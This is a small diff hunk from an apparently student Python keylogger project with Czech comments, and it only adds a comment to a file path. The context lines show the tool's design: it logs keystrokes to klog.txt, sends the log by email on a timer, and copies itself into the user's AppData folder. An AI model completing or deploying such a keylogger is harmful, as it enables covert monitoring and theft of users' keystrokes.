@@ -11,7 +11,7 @@ from getpass import getuser     #pro ziskani uzivatelskeho jmena prihlaseneho uz
 from threading import Timer     #pro dalsi vlakno pro casovac pro odesilani mailu
 
 log_file = "klog.txt"    #nazev souboru pro ukladani klaves    
-file_path = "D:\\Škola\\UNOB\\7. semestr\\Vývoj a správa IS\\Python\\ProjektKeylogger\\"  #cesta k souboru pro ukladani klaves
+file_path = "D:\\Škola\\UNOB\\7. semestr\\Vývoj a správa IS\\Python\\ProjektKeylogger\\"  #cesta k souboru pro ukladani klaves - nevyuzivam
 
 username = getuser()    #ziskani uzivatelskeho jmena prihlaseneho uzivatele
 destination_path = f"C:\\Users\\{username}\\AppData\\"  #cesta do slozky pro ulozeni odchytavace
